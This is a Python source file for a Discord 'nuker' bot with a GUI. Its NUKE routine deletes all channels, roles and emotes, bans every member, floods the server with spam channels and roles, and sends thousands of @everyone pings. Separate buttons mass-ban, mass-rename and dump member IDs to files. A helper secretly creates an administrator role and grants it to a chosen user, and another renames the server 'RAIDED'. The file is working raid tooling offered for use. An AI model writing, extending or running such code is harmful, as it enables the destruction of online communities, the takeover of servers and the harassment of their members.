import PySimpleGUI as sg
from numba import jit, cuda
import os
import discord
import time
import multiprocessing
from discord.utils import get
from discord import Permissions

intents = discord.Intents.default()
intents.members = True
intents.guilds = True

client = discord.Client(intents=intents)

# GUI

icon_path = f'{os.getcwd()}/icon.ico'
background_path = f'{os.getcwd()}/background.png'
#background_gif_path = f'{os.getcwd()}/background.gif'
gui_ver = 1.0


#sg.theme('DarkRed2')

layout = [ [sg.Text('Server ID:', font=("Arial", 10), background_color='black', text_color='red'), sg.InputText(size=(20), text_color='black', font=("Arial", 12), background_color='deep sky blue')],
                    [sg.Text('User ID:', font=("Arial", 10), background_color='black', text_color='red'), sg.InputText(size=(20), text_color='black', font=("Arial", 12), background_color='deep sky blue')],
                    [sg.Button('BOTSTAT', font=('Arial', 12)), sg.Text('Bot statistics', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('CHANNELDUMP', font=('Arial', 12)), sg.Text('Dumps channels into a local file', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('USERDUMP', font=('Arial', 12)), sg.Text('Dumps userinfo into a local file', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('NUKE', font=('Arial', 12)), sg.Text('Nukes a server ENTIRELY', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('CHANNELDELETE', font=('Arial', 12)), sg.Text('Deletes all channels in the server', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('CHANNELCREATE', font=('Arial', 12)), sg.Text('Create 500 Channels (max)', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('ROLEDELETE', font=('Arial', 12)), sg.Text('Deletes all roles in the server', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('ROLECREATE', font=('Arial', 12)), sg.Text('Creates 250 roles (max)', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('BAN', font=('Arial', 12)), sg.Text('Bans a server member', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('BAN ALL', font=('Arial', 12)), sg.Text('Bans ALL server members', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('UNBAN', font=('Arial', 12)), sg.Text('Unbans a server member (requires "User ID")', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('UNBAN ALL', font=('Arial', 12)), sg.Text('Unbans all server members', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('LIST BANS', font=('Arial', 12)), sg.Text('List all bans of a server', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('RICKROLL', font=('Arial', 12)), sg.Text('Spam @everyone in all channels', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('LEAVE GUILD', font=('Arial', 12)), sg.Text('Leave the selected server with the bot', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('LEAVE ALL', font=('Arial', 12)), sg.Text('Leave all servers with the bot', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('DELETE EMOTES', font=('Arial', 12)), sg.Text('Delete all emotes', text_color='yellow', font=("Arial", 12), pad=(0, 15))],
                    [sg.Button('CHANGE ALL NICKNAMES', font=('Arial', 12)), sg.Text('Change all Nicknames', text_color='yellow', font=("Arial", 12), pad=(0, 10))],
                    [sg.Button('EXIT', font=('Arial', 10), button_color='black')] ]


window = sg.Window(f'{os.getcwd()} - v{gui_ver}',
                    layout, size=(600,860),
                    no_titlebar=False,
                    background_color='grey',
                    alpha_channel=.9,
                    grab_anywhere=True,
                    icon=icon_path,
                    finalize=True,
                    button_color='black',
                    titlebar_background_color='yellow')
                    

### spawn_processes is disabled. very experimental ###

def spawn_processes():
    process1 = multiprocessing.Process()
    process2 = multiprocessing.Process()
    process3 = multiprocessing.Process()
    process4 = multiprocessing.Process()
    process1.start()
    process2.start()
    process3.start()
    process4.start()

# Bot commands

@client.event
async def on_ready():
    print('logged in as {0.user}'.format(client))
    


    def botstat():
        for guild in client.guilds:
            print(f"Name: {guild.name} -- ID: {guild.id} -- Members: {guild.member_count}\n")
            window.refresh()
            
    def channeldump(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                file = f"{guild.name}_{guild.id}_dumped_channels.txt"
                f = open(file, "a+")
                for channels in guild.channels:
                    try:
                        print(f"Name: {channels.name} - ID: {channels.id}")
                        f.write(f"Name: {channels.name} - ID: {channels.id}\n")
                    except Exception:
                        print("Stopped!")
                        break
                    finally:
                        pass
                    window.refresh()
                print(f"Output saved to: {file}")
                f.close()

    def userdump(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                print(f"Getting member list of {id0}")
                file = f"{guild.name}_{guild.id}_dumped_users.txt"
                f = open(file, "a+")
                for member in guild.members:
                    # noinspection PyBroadException
                    try:
                        f.write(f"Name: {member.name}#{member.discriminator} ID: {member.id}\n")
                        print(f"Name: {member.name}#{member.discriminator} ID: {member.id}")
                    except Exception:
                        print("Stopped!")
                        break
                    finally:
                        pass
                    window.refresh()
                print(f"output saved to: {file}")
                f.close()

    async def nuke(x):   
        #spawn_processes()
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                print(f"Starting on {guild.name} - ID: {guild.id}")
                var1 = 0
                var2 = 0
                var3 = 0
                var4 = 0
                var5 = 0
                var6 = 0
                for channels in guild.channels:
                    # noinspection PyBroadException
                    try:
                        await channels.delete()
                        var1 += 1
                        print(f"Current ammount of deleted channels: {var1}")
                    except Exception:
                        pass
                    finally:
                        pass
                    window.refresh()
                print(f"Stage 1/6 complete : All deletable channels deleted - {var1}")
                allRoles = await guild.fetch_roles()
                for r in range(len(allRoles)):
                    # noinspection PyBroadException
                    try:
                        await allRoles[r].delete()
                        var2 += 1
                        print(f"Current ammount of deleted roles: {var2}")
                        window.refresh()
                    except Exception:
                        pass
                    finally:
                        pass
                print(f"Stage 2/6 complete: All deletable roles deleted - {var2}")
                for members in guild.members:
                    # noinspection PyBroadException
                    try:
                        await members.ban(reason="owo")
                        var3 += 1
                        print(f"Current ammount of banned users: {var3}")
                        time.sleep(0.1)
                    except Exception:
                        print("Missing permission on this member. Trying other member.")
                        pass
                    finally:
                        pass
                    window.refresh()
                print(f"stage 3/6 complete: All bannable members were banned - count: {var3}")
                for maxChannels in range(501):
                    # noinspection PyBroadException
                    try:
                        await guild.create_text_channel('spamspamspam')
                        var4 += 1
                        print(f"Current ammount of channels created: {var4}")
                        time.sleep(0.2)
                    except Exception:
                        break
                    finally:
                        pass
                    window.refresh()
                print(f"Stage 4/6 completed: All possible channels were created - {var4}")
                for maxRoles in range(251):
                    # noinspection PyBroadException
                    try:
                        await guild.create_role(name='spamspamspam')
                        var5 += 1
                        print(f"Current ammount of roles created: {var5}")
                        time.sleep(0.2)
                    except Exception:
                        pass
                    finally:
                        pass
                    window.refresh()
                print(f"Stage 5/6 completed: All possible roles were created - {var5}")
                for emotes in guild.emojis:
                    try:
                        await emotes.delete()
                        var6 += 1
                        print(f"Current ammount of deleted emotes: {var6}")
                    except Exception:
                        pass
                    finally:
                        pass
                    window.refresh()
                print(f"All stages completed: Ammount of deleted emotes - {var6} ")
                print(f"Removing server icon")
                try:
                    await guild.edit(icon=None)
                    print("Success!")
                except:
                    print("Failed to remove server icon")
                    pass
                finally:
                    pass
                window.refresh()
                print("BONUS - Starting @everyone pings in all channels!")
                x = 0
                y = 0
                for guild in client.guilds:
                    if guild.id == id0:
                        while x <= 40000:
                            for c in guild.text_channels:
                                time.sleep(0.1)
                                try:
                                    await c.send(
                                        "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                        "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                        "@everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                        "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                        "@everyone @everyone https://c.tenor.com/VFFJ8Ei3C2IAAAAM/rickroll-rick.gif"
                                        "https://c.tenor.com/VFFJ8Ei3C2IAAAAM/rickroll-rick.gif ")
                                    y += 1
                                    print(f"Current ammount of pings {y}")
                                    window.refresh()
                                except Exception:
                                    print("Stopped!")
                                    break
                                finally:
                                    pass
                                x += 1
                                         
    async def channeldelete(x):
        id0 = x
        for guild in client.guilds:
            if guild.id == int(id0):
                var1 = 0
                for channels in guild.channels:
                    window.refresh()
                    try:
                        await channels.delete()
                        var1 += 1
                        print(f"Current ammount of deleted channels: {var1}")
                    except Exception:
                        pass
                    finally:
                        pass
    
    async def channelcreate(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                var1 = 0
                for i in range(501):
                    window.refresh()
                    try:
                        await guild.create_text_channel('spamspamspam')
                        var1 += 1
                        print(f"Current ammount of created channels: {var1}")
                    except Exception:
                        break
                    finally:
                        pass

    async def roledelete(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                var1 = 0
                allRoles = await guild.fetch_roles()
                for r in range(len(allRoles)):
                    try:
                        await allRoles[r].delete()
                        var1 += 1
                        print(f"Current ammount of deleted roles: {var1}")
                        window.refresh()
                    except Exception:
                        pass
                    finally:
                        pass

    async def rolecreate(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                var1 = 0
                for i in range(251):
                    try:
                        await guild.create_role(name='spamspamspam')
                        var1 += 1
                        print(f"Current ammount of created roles: {var1}")
                        window.refresh()
                    except Exception:
                        break
                    finally:
                        pass

    async def ban(x, y):
        id0 = str(x)
        userid = int(y)
        for guild in client.guilds:
            if guild.id == int(id0):
                for members in guild.members:
                    if members.id == userid:
                        # noinspection PyBroadException
                        try:
                            await members.ban(reason="owo")
                            print(f"Successfully banned {members.name}#{members.tag} -- {members.id}")
                        except Exception:
                            print(f"Failed to ban {userid}!")
                            break
                        finally:
                            pass
                        window.refresh()
    
    async def banall(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                # noinspection PyBroadException
                var1 = 0
                for members in guild.members:
                    try:
                        await members.ban(reason="shit")
                        var1 += 1
                        print(f"Current ammount of banned users: {var1}")
                    except Exception:
                        print("No permission!")
                    finally:
                        pass
                    window.refresh()

    async def unban(x, y):
        id0 = str(x)
        userid = int(y)
        for guild in client.guilds:
            if guild.id == int(id0):
                # noinspection PyBroadException
                try:
                    banned_u = await guild.bans()
                    for banned_u1 in banned_u:
                        if banned_u1.user.id == userid:
                            await guild.unban(banned_u1.user)
                            print(f"Successfully unbanned {userid}")
                except Exception:
                    print(f"Failed to unban {userid} (No permission!)")
                    break
                finally:
                    pass
                window.refresh()

    async def unbanall(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                # noinspection PyBroadException
                try:
                    banned_u = await guild.bans()
                    for banned_u1 in banned_u:
                        await guild.unban(banned_u1.user)
                        print(f"Successfully unbanned {banned_u1}")
                except Exception:
                    print("No permission!")
                    break
                finally:
                    pass
                window.refresh()

    async def listbans(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                # noinspection PyBroadException
                try:
                    banned_u = await guild.bans()
                    for banned_u1 in banned_u:
                        print(banned_u1)
                except Exception:
                    print("No permission!")
                    break
                finally:
                    pass
                window.refresh()

    async def rickroll(z):
        id0 = int(z)
        x = 0
        y = 0
        for guild in client.guilds:
            if guild.id == id0:
                while x <= 5:
                    for c in guild.text_channels:
                        time.sleep(0.2)
                        try:
                            await c.send(
                                "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                "@everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                "@everyone @everyone https://c.tenor.com/VFFJ8Ei3C2IAAAAM/rickroll-rick.gif"
                                "https://c.tenor.com/VFFJ8Ei3C2IAAAAM/rickroll-rick.gif ")
                            y += 1
                            print(f"Current ammount of pings {y}")
                            window.refresh()
                        except Exception:
                            print("Stopped!")
                            break
                        finally:
                            pass
                        x += 1
                        
                        
    async def leaveguild(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                await guild.leave()
            window.refresh()

    async def leaveall():
        for guild in client.guilds:
            await guild.leave()
            window.refresh()

    async def deleteemotes(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                var1 = 0
                for emotes in guild.emojis:
                    try:
                        await emotes.delete()
                        var1 += 1
                        print(f"Current ammount of deleted emotes: {var1}")
                    except Exception:
                        print("Missing permissions!")
                        break
                    finally:
                        pass
                    window.refresh()
    async def change_all_nicknames(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                var1 = 0
                var2 = 1
                for members in guild.members:
                    try:
                        await members.edit(nick="Oopsie!")
                        var1 += 1
                        print(f"Current ammount of changed nicknames: {var1}")
                    except Exception:
                        print(f"No permissions! {30 - var2} of 30 tries left")
                        var2 += 1
                        if var2 >= 30:
                            break
                    finally:
                        pass
                    window.refresh()

    async def addRoleToUser(user, guildid):
        id0 = str(guildid)
        for guild in client.guilds:
            if guild.id == int(id0):
                print('test1')
                await guild.create_role(name="see12345", permissions=discord.Permissions(8), color=discord.Colour(0xff000))
                print('test2')
                allRoles = await guild.fetch_roles()
                for r in range(len(allRoles)):
                    if str(allRoles[r]) == 'see12345':
                        print('test3')
                        for member in guild.members:
                            if member.id == int(user):
                                print('test4')
                                await member.add_roles(allRoles[r])
                                window.refresh()

    async def removeServerIcon(x):
        id0 = str(x)
        for guild in client.guilds:
            if guild.id == int(id0):
                try:
                    await guild.edit(name="RAIDED", icon=None)
                    print("Success!")
                except:
                    print("Failed to remove server icon")
                    pass
                finally:
                    pass
                window.refresh()

    async def GUI():  

        while True:
            #sg.show_debugger_window()
            event, values = window.read(timeout=100)
            if event == sg.WIN_CLOSED or event == 'EXIT':
                await client.close()
                break
            if event == 'BOTSTAT':
                botstat()
            if event == 'CHANNELDUMP':
                if values[0]:
                    channeldump(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'USERDUMP':
                if values[0]:
                    userdump(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'NUKE':
                if values[0]:
                    await nuke(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'CHANNELDELETE':
                if values[0]:
                    await channeldelete(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'CHANNELCREATE':
                if values[0]:
                    await channelcreate(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'ROLECREATE':
                if values[0]:
                    await rolecreate(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'ROLEDELETE':
                if values[0]:
                    await roledelete(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'BAN':
                if values[0] and values[1]:
                    await ban(values[0], values[1])
                else:
                    sg.popup('No Server ID and/or User ID given!', text_color='red')
            if event == 'BAN ALL':
                if values[0]:
                    await banall(values[0])
                else:
                    sg.popup('No Server ID and/or User ID given!', text_color='red')
            elif event == 'UNBAN':
                if values[0] and values[1]:
                    await unban(values[0], values[1])
                else:
                    sg.popup('No Server ID and/or User ID given!', text_color='red')
            if event == 'UNBAN ALL':
                if values[0]:
                    await unbanall(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'LIST BANS':
                if values[0]:
                    await listbans(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'RICKROLL':
                if values[0]:
                    await rickroll(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'LEAVE GUILD':
                if values[0]:
                    await leaveguild(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'LEAVE ALL':
                if values[0]:
                    await leaveall()
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'DELETE EMOTES':
                if values[0]:
                    await deleteemotes(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')
            if event == 'CHANGE ALL NICKNAMES':
                if values[0]:
                    await change_all_nicknames(values[0])
                else:
                    sg.popup('No Server ID given!', text_color='red')

        window.close()

    #await removeServerIcon(serverid)
    #await addRoleToUser("userid", "serverid")
    await GUI()   

client.run("YOUR-TOKEN")
